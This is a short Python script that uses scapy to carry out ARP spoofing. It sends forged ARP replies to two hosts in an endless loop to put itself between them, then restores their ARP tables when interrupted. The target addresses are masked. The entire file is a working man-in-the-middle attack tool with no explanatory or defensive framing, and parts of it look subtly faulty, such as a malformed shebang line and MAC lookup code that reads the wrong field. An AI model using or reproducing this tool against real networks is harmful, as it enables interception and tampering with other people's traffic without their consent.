#!usr/bin/etc/env python
# -*- coding: utf-8 -*-

import scapy.all as scapy
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwdst


def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2,pdst = target_ip,hwdst = target_mac,
                       psrc = spoof_ip)
    scapy.send(packet,verbose = False)

def restore(dest_ip,src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)

    packet = scapy.ARP(op=2, pdst = dest_ip, hwdst = dest_mac,
                       psrc = src_ip, hwsrc = src_mac)
    scapy.send(packet, count = 10, verbose = False)



sent_packets_counter = 0
try:

    while True:
        spoof('**.**.**.**','**.**.**.**')
        spoof('**.**.**.**','**.**.**.**')
        sent_packets_counter += 2

        print('\r[+] Packets sent: ' + str(sent_packets_counter)),
        sys.stdout.flush()

except KeyboardInterrupt:
    print('\r[=] Resetting ARP-table.Good Luck C:')
    restore('**.**.**.**','**.**.**.**')
    restore('**.**.**.**','**.**.**.**')
